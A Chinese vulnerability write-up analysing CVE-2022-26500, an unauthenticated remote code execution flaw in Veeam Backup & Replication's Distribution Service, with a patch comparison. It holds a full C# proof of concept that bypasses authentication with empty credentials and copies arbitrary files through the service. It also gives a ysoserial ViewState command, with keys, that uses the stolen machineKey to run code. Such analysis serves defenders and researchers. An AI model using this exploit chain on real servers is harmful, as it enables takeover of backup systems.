**作者：Y4er**  
**原文链接：<https://y4er.com/post/cve-2022-26500-veeam-backup-replication-rce/>**

看推特又爆了cve，感觉挺牛逼的洞，于是分析一手。

## 官方公告

<https://www.veeam.com/kb4288>

> The Veeam Distribution Service (TCP 9380 by default) allows unauthenticated
> users to access internal API functions. A remote attacker may send input to
> the internal API which may lead to uploading and executing of malicious
> code.

漏洞描述说是tcp9380服务出了问题，直接分析就行了。

## 环境

[VeeamBackup &
Replication_11.0.1.1261_20211211.iso](https://download2.veeam.com/VBR/v11/VeeamBackup&Replication_11.0.1.1261_20211211.iso
"VeeamBackup & Replication_11.0.1.1261_20211211.iso")

还有补丁包[VeeamBackup&Replication_11.0.1.1261_20220302.zip](https://download2.veeam.com/VBR/v11/VeeamBackup&Replication_11.0.1.1261_20220302.zip
"VeeamBackup&Replication_11.0.1.1261_20220302.zip")的下载地址

搭建过程就不说了，参考[官方文档](https://helpcenter.veeam.com/docs/backup/vsphere/install_vbr.html?ver=110
"官方文档")

**需要注意的是1和2都需要装**
![](https://images.seebug.org/content/images/2022/04/6563ef8d-37e7-460e-bb9a-c4f78b392d46.png-w331s)

## 分析

在我分析的时候遇到了几个问题，最关键的就是怎么构造参数通过tcp传递给服务器，踩了很多坑，接下来的分析我分为三部分写。

### 寻找漏洞点

先找到9380端口占用的程序

![](https://images.seebug.org/content/images/2022/04/6b5b8f6c-8801-495e-8a21-0918c15a4fbe.png-w331s)

定位到`Veeam.Backup.Agent.ConfigurationService.exe`
![](https://images.seebug.org/content/images/2022/04/7146529b-b504-44a9-ab66-1fc172178ffd.png-w331s)

发现是个服务程序
![](https://images.seebug.org/content/images/2022/04/0625dbb5-6a8f-4d1b-b979-9403fcbe2a00.png-w331s)

在OnStart中监听两个端口
![](https://images.seebug.org/content/images/2022/04/dde0cfbe-b986-4623-a39f-28e0f871e27b.png-w331s)

_negotiateServer监听9380 _sslServer监听9381，接下来是tcp编程常见的写法，开线程传递委托，最终处理函数为

`Veeam.Backup.ServiceLib.CInvokerServer.HandleTcpRequest(object)`，在这个函数中有鉴权处理
![](https://images.seebug.org/content/images/2022/04/00ce8923-2207-42f5-8942-2c14f25aad89.png-w331s)

跟入
`Veeam.Backup.ServiceLib.CForeignInvokerNegotiateAuthenticator.Authenticate(Socket)`
![](https://images.seebug.org/content/images/2022/04/1dee3988-4867-406f-9ace-fbf37ac7cd0a.png-w331s)

这个地方的鉴权可以被绕过，使用空账号密码来连接即可，绕过代码如下

    
    
    internal class Program
    {
        static TcpClient client = null;
        static void Main(string[] args)
        {
            IPAddress ipAddress = IPAddress.Parse("172.16.16.76");
            IPEndPoint remoteEP = new IPEndPoint(ipAddress, 9380);�
            client = new TcpClient();
            client.Connect(remoteEP);
            Console.WriteLine("Client connected to {0}.", remoteEP.ToString());
    
            NetworkStream clientStream = client.GetStream();
            NegotiateStream authStream = new NegotiateStream(clientStream, false);
            try
            {
                NetworkCredential netcred = new NetworkCredential("", "");
                authStream.AuthenticateAsClient(netcred, "", ProtectionLevel.EncryptAndSign, TokenImpersonationLevel.Identification);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            finally
            {
                authStream.Close();
            }
            Console.ReadKey();
        }
    }

dnspy附加进程调试之后，发现成功绕过鉴权返回result
![](https://images.seebug.org/content/images/2022/04/0db542b6-a8ad-49d8-bf3d-bd8ca9b03d1b.png-w331s)

接着跟入又是tcp编程的写法，异步callback，关键函数在`Veeam.Backup.ServiceLib.CInvokerServer.ExecThreadProc(object)`
![](https://images.seebug.org/content/images/2022/04/81ddab83-2816-43b6-8f92-f236f60ae7d5.png-w331s)

tcp压缩数据流通过ReadCompressedString读出字符串，然后通过`CForeignInvokerParams.GetContext(text)`获取上下文，然后交由`this.DoExecute(context,
cconnectionState)`进行分发调用。

在GetContext函数中

    
    
    public static CSpecDeserializationContext GetContext(string xml)
    {
        return new CSpecDeserializationContext(xml);
    }

将字符串交给CSpecDeserializationContext构造函数
![](https://images.seebug.org/content/images/2022/04/f9737139-985b-48d2-92a6-fb9a2f55e9ad.png-w331s)

说明我们向服务端发送的tcp数据流应该是一个压缩之后的xml字符串，需要正确构造xml。那么需要什么样格式呢？

先来看DoExecute()
![](https://images.seebug.org/content/images/2022/04/73046570-1a46-478f-b7aa-1b3cda097017.png-w331s)

GetOrCreateExecuter()是拿到被执行者Executer
![](https://images.seebug.org/content/images/2022/04/b91997b2-3260-43da-92b4-9a57d08a1377.png-w331s)

根据传入参数不同分别返回三个不同的Executer

  1. CInvokerServerRetryExecuter 重试Executer
  2. CInvokerServerAsyncExecuter 异步Executer
  3. CInvokerServerSyncExecuter 同步Executer

获取到Executer之后进入Executer的Execute()函数，Execute()来自于IInvokerServerExecuter接口，分析实现类刚好就是上面的三个类
![](https://images.seebug.org/content/images/2022/04/8c555502-b5fb-480a-88c6-a0335a166dad.png-w331s)

在CInvokerServerSyncExecuter同步执行类的Execute函数中，调用this._specExecuter.Execute(context,
state)继续往下分发
![](https://images.seebug.org/content/images/2022/04/f9d8fea3-956f-46ff-bcc0-2a041c59e8a4.png-w331s)

而_specExecuter字段的类型也是一个接口IInvokerServerSpecExecuter，有三个实现类。
![](https://images.seebug.org/content/images/2022/04/13365a61-d241-440e-8b26-803bda23645d.png-w331s)

在`Veeam.Backup.EpAgent.ConfigurationService.CEpAgentConfigurationServiceExecuter.Execute(CSpecDeserializationContext,
CConnectionState)`中可以很敏感的看到upload相关的东西

    
    
    private string Execute(CForeignInvokerParams invokerParams, string certificateThumbprint, string remoteHostAddress)
    {
        CConfigurationServiceBaseSpec cconfigurationServiceBaseSpec = (CConfigurationServiceBaseSpec)invokerParams.Spec;
        CInputXmlData cinputXmlData = new CInputXmlData("RIResponse");
        cinputXmlData.SetBool("PersistentConnection", true);
        string text = ((EConfigurationServiceMethod)cconfigurationServiceBaseSpec.Method).ToString();
        Log.Message("Command '{0}' ({1})", new object[]
        {
            text,
            remoteHostAddress
        });
        EConfigurationServiceMethod method = (EConfigurationServiceMethod)cconfigurationServiceBaseSpec.Method;
        switch (method)
        {
        ........省略.......
        case EConfigurationServiceMethod.UploadManagerGetFolders:
            CEpAgentConfigurationServiceExecuter.ExecuteUploadManagerGetFolders((CConfigurationServiceUploadManagerGetFolders)cconfigurationServiceBaseSpec, cinputXmlData);
            goto IL_1B1;
        case EConfigurationServiceMethod.UploadManagerIsFileInCache:
            CEpAgentConfigurationServiceExecuter.ExecuteUploadManagerIsFileInCache((CConfigurationServiceUploadManagerIsFileInCache)cconfigurationServiceBaseSpec, cinputXmlData);
            goto IL_1B1;
        case EConfigurationServiceMethod.UploadManagerPerformUpload:
            CEpAgentConfigurationServiceExecuter.ExecuteUploadManagerPerformUpload((CConfigurationServiceUploadManagerPerformUpload)cconfigurationServiceBaseSpec, cinputXmlData);
            goto IL_1B1;
        default:
            if (method == EConfigurationServiceMethod.Disconnect)
            {
                CEpAgentConfigurationServiceExecuter.ExecuteDisconnect();
                goto IL_1B1;
            }
            break;
        }
        throw new Exception("Failed to process command '" + text + "': Executer not implemented");
        IL_1B1:
        return cinputXmlData.Serial();
    }

其中case到UploadManagerPerformUpload时，进入ExecuteUploadManagerPerformUpload函数处理文件上传

    
    
    private static void ExecuteUploadManagerPerformUpload(CConfigurationServiceUploadManagerPerformUpload spec, CInputXmlData response)
    {
        string host = spec.Host;
        if (!File.Exists(spec.FileProxyPath))
        {
            throw new Exception(string.Concat(new string[]
            {
                "Failed to upload file '",
                spec.FileProxyPath,
                "' to host ",
                host,
                ": File doesn't exist in cache"
            }));
        }
        string value;
        if (spec.IsWindows)
        {
            if (spec.IsFix)
            {
                value = CEpAgentConfigurationServiceExecuter.UploadWindowsFix(spec);
            }
            else
            {
                if (!spec.IsPackage)
                {
                    throw new Exception(string.Concat(new string[]
                    {
                        "Fatal logic error: Failed to upload file '",
                        spec.FileProxyPath,
                        "' to host ",
                        host,
                        ": Unexpected upload task type"
                    }));
                }
                value = CEpAgentConfigurationServiceExecuter.UploadWindowsPackage(spec);
            }
        }
        else
        {
            if (!spec.IsLinux)
            {
                throw new Exception(string.Concat(new string[]
                {
                    "Fatal logic error: Failed to upload file '",
                    spec.FileProxyPath,
                    "' to host ",
                    host,
                    ": Unexpected target host type"
                }));
            }
            value = CEpAgentConfigurationServiceExecuter.UploadLinuxPackage(spec);
        }
        response.SetString("RemotePath", value);
    }

分别有三个UploadWindowsFix、UploadWindowsPackage、UploadLinuxPackage函数，跟到UploadWindowsPackage中看到UploadFile函数。
![](https://images.seebug.org/content/images/2022/04/cc19e894-7c5b-4ecf-897f-61899b64d39e.png-w331s)

在UploadFile函数中将localPath读取然后写入到remotePath中。
![](https://images.seebug.org/content/images/2022/04/7d247310-ecec-4f97-bfc9-3bde8b7b97b2.png-w331s)

如果把远程主机赋值为127.0.0.1，我们就可以在目标机器上任意复制文件。

### 构造payload

在整个调用过程中，我遇到了多个问题，下面分步骤讲解

  1. CForeignInvokerParams.GetContext(text);
  2. GetOrCreateExecuter
  3. Veeam.Backup.EpAgent.ConfigurationService.CEpAgentConfigurationServiceExecuter.Execute(CSpecDeserializationContext, CConnectionState)

在上文分析中我们知道，需要让程序的Executer设置为CInvokerServerSyncExecuter实例。而在GetOrCreateExecuter取Executer实例时是根据CForeignInvokerParams.GetContext(text)的值来决定的。上文追溯到了这里CSpecDeserializationContext的构造函数
![](https://images.seebug.org/content/images/2022/04/adb6ef55-71b1-47f9-bfa7-b9722aff14fa.png-w331s)

几个必填字段

  1. FIData
  2. FISpec
  3. FISessionId

    
    
    CInputXmlData FIData = new CInputXmlData("FIData");
    CInputXmlData FISpec = new CInputXmlData("FISpec");
    FISpec.SetGuid("FISessionId", Guid.Empty);
    FIData.InjectChild(FISpec);

将FISessionId赋值为Guid.Empty即可拿到CInvokerServerSyncExecuter

接着来看还需要什么，在
`Veeam.Backup.EpAgent.ConfigurationService.CEpAgentConfigurationServiceExecuter.Execute(CSpecDeserializationContext,
CConnectionState)`中

    
    
    public string Execute(CSpecDeserializationContext context, CConnectionState state)
    {
        return this.Execute(context.GetSpec(new CCommonForeignDeserializationContextProvider()), state.FindCertificateThumbprint(), state.RemoteEndPoint.ToString());
    }

context.GetSpec()函数是重要点。
![](https://images.seebug.org/content/images/2022/04/ee339111-3438-4de8-bda1-06bd87bc82d3.png-w331s)

他将传入的`this._specData`也就是我们构造的xml数据进行解析，跟进去看看

    
    
    public static CForeignInvokerSpec Unserial(COutputXmlData datas, IForeignDeserializationContextProvider provider)
    {
        EForeignInvokerScope scope = CForeignInvokerSpec.GetScope(datas);
        CForeignInvokerSpec cforeignInvokerSpec;
        if (scope <= EForeignInvokerScope.CatIndex)
        {
            ......
        }
        else if (scope <= EForeignInvokerScope.Credentials)
        {
            if (scope == EForeignInvokerScope.DistributionService)
            {
                cforeignInvokerSpec = CConfigurationServiceBaseSpec.Unserial(datas);
                goto IL_240;
            }
            ...
        }
        .....
        throw ExceptionFactory.Create("Unknown invoker scope: {0}", new object[]
        {
            scope
        });
        IL_240:
        cforeignInvokerSpec.SessionId = datas.GetGuid("FISessionId");
        cforeignInvokerSpec.ReusableConnection = datas.FindBool("FIReusableConnection", false);
        cforeignInvokerSpec.RetryableConnection = datas.FindBool("FIRetryableConnection", false);
        return cforeignInvokerSpec;
    }

先从xml中拿一个FIScope标签，并且要是EForeignInvokerScope枚举的值之一
![](https://images.seebug.org/content/images/2022/04/256c0767-2dbe-487a-a076-02c92dafd721.png-w331s)

case
FIScope标签之后会判断不同分支，返回不同的实例，而在`Veeam.Backup.EpAgent.ConfigurationService.CEpAgentConfigurationServiceExecuter.Execute(CForeignInvokerParams,
string, string)`中我们需要的是CConfigurationServiceBaseSpec实例，因为这个地方进行了强制类型转换

![](https://images.seebug.org/content/images/2022/04/3d86fc76-f8cd-49b8-91a0-c4d9b279a99e.png-w331s)

所以我们再写入一个xml标签，EForeignInvokerScope.DistributionService值为190

    
    
    FISpec.SetInt32("FIScope", 190);

除此之外还需要case一个FIMethod来进入UploadManagerPerformUpload上传的逻辑。

    
    
    FISpec.SetInt32("FIMethod", (int)EConfigurationServiceMethod.UploadManagerPerformUpload);

接下来就是上传的一些参数，我这里就不再继续写了，通过CInputXmlData和CXmlHelper2两个工具类可以很方便的写入参数。

最终构造

    
    
    internal class Program
    {
    static TcpClient client = null;
    static void Main(string[] args)
    {
        IPAddress ipAddress = IPAddress.Parse("172.16.16.76");
        IPEndPoint remoteEP = new IPEndPoint(ipAddress, 9380);
        client = new TcpClient();
        client.Connect(remoteEP);
        Console.WriteLine("Client connected to {0}.", remoteEP.ToString());
    
        NetworkStream clientStream = client.GetStream();
        NegotiateStream authStream = new NegotiateStream(clientStream, false);
        try
        {
            NetworkCredential netcred = new NetworkCredential("", "");
            authStream.AuthenticateAsClient(netcred, "", ProtectionLevel.EncryptAndSign, TokenImpersonationLevel.Identification);
            CInputXmlData FIData = new CInputXmlData("FIData");
            CInputXmlData FISpec = new CInputXmlData("FISpec");
            FISpec.SetInt32("FIScope", 190);
            FISpec.SetGuid("FISessionId", Guid.Empty);
            //FISpec.SetInt32("FIMethod", (int)EConfigurationServiceMethod.UploadManagerGetFolders);
            FISpec.SetInt32("FIMethod", (int)EConfigurationServiceMethod.UploadManagerPerformUpload);
            FISpec.SetString("SystemType", "WIN");
            FISpec.SetString("Host", "127.0.0.1");
            IPAddress[] HostIps = new IPAddress[] { IPAddress.Loopback };
            FISpec.SetStrings("HostIps", ConvertIpsToStringArray(HostIps));
            FISpec.SetString("User", SStringMasker.Mask("", "{e217876c-c661-4c26-a09f-3920a29fc11f}"));
            FISpec.SetString("Password", SStringMasker.Mask("", "{e217876c-c661-4c26-a09f-3920a29fc11f}"));
            FISpec.SetString("TaskType", "Package");
            FISpec.SetString("FixProductType", "");
            FISpec.SetString("FixProductVeresion", "");
            FISpec.SetUInt64("FixIssueNumber", 0);
            FISpec.SetString("SshCredentials", SStringMasker.Mask("", "{e217876c-c661-4c26-a09f-3920a29fc11f}"));
            FISpec.SetString("SshFingerprint", "");
            FISpec.SetBool("SshTrustAll", true);
            FISpec.SetBool("CheckSignatureBeforeUpload", false);
            FISpec.SetEnum<ESSHProtocol>("DefaultProtocol", ESSHProtocol.Rebex);
            FISpec.SetString("FileRelativePath", "FileRelativePath");
            FISpec.SetString("FileRemotePath", @"C:\windows\test.txt");
            FISpec.SetString("FileProxyPath", @"C:\windows\win.ini");
            FIData.InjectChild(FISpec);
    
            Console.WriteLine(FIData.Root.OuterXml);
    
            new BinaryWriter(authStream).WriteCompressedString(FIData.Root.OuterXml, Encoding.UTF8);
    
            string response = new BinaryReader(authStream).ReadCompressedString(int.MaxValue, Encoding.UTF8);
            Console.WriteLine("response:");
            Console.WriteLine(response);
        }
        catch (Exception e)
        {
            Console.WriteLine(e);
        }
        finally
        {
            authStream.Close();
        }
        Console.ReadKey();
    }

成功复制文件。

![](https://images.seebug.org/content/images/2022/04/044561a5-b2f4-40b3-9f3c-05cd685885eb.png-w331s)

### getshell

目前只是能复制服务器上已有的文件，文件名可控，但是文件内容不可控。如何getshell？

看了看安装完成之后的Veeam有几个web
![](https://images.seebug.org/content/images/2022/04/7f31d4d3-0d64-44fa-ba13-b98b3991701a.png-w331s)

在`C:\Program Files\Veeam\Backup and Replication\Enterprise
Manager\WebApp\web.config`中有machineKey，然后就是懂得都懂了，把web.config复制一份写入到1.txt中，然后通过web访问拿到machineKey

![](https://images.seebug.org/content/images/2022/04/2401fd7b-fde8-4424-b930-0bc4bbb3a283.png-w331s)

最后ViewState反序列化就行了。

    
    
    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc" --validationkey="0223A772097526F6017B1C350EE18B58009AF1DCF4C8D54969FEFF9721DF6940948B05A192FA6E64C74A9D7FDD7457BB9A59AF55D1D84771A1E9338C4C5E531D" --decryptionalg="AES"  --validationalg="HMACSHA256" --decryptionalg="AES" --decryptionkey="0290D18D19402AE3BA93191364A5619EF46FA7E42173BB8C" --minfy --path="/error.aspx"

![](https://images.seebug.org/content/images/2022/04/8f4fadce-5042-46a4-a185-e7e532dcb3c7.png-w331s)

## 修复

对比补丁，上传的地方加了文件名校验

![](https://images.seebug.org/content/images/2022/04/c06ba7de-cf72-4714-a9b7-2a5b535f85b2.png-w331s)

授权的地方用的CInvokerAdminNegotiateAuthenticator
![](https://images.seebug.org/content/images/2022/04/fa4cc130-6ef2-43e3-b5ef-758ad22a339c.png-w331s)

不仅判断了是不是授权用户，而且判断了是否是管理员
![](https://images.seebug.org/content/images/2022/04/6f74442a-09aa-40d8-91ac-07defc5b15e9.png-w331s)

## 总结

这个漏洞给我的感觉学到了很多东西，像tcp编程，Windows鉴权机制在csharp中的应用，以及在大型应用文件传输的一些漏洞点。

另外最后一点通过复制文件拿到web.config是我自己想出来的思路，不知道漏洞发现者Nikita Petrov是否和我的做法一致，或者还有其他的利用方式。

漏洞修复了鉴权，但是感觉授权之后仍然可能会存在一些其他的漏洞，毕竟CInvokerServerSyncExecuter仍然有很多的Service可以走，而不仅仅是CEpAgentConfigurationServiceExecuter。

分析这个洞我并不是全部正向看的，更多取决于补丁diff，但是这种大型软件的开发架构让我自己感觉学到了很多。

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1873/>

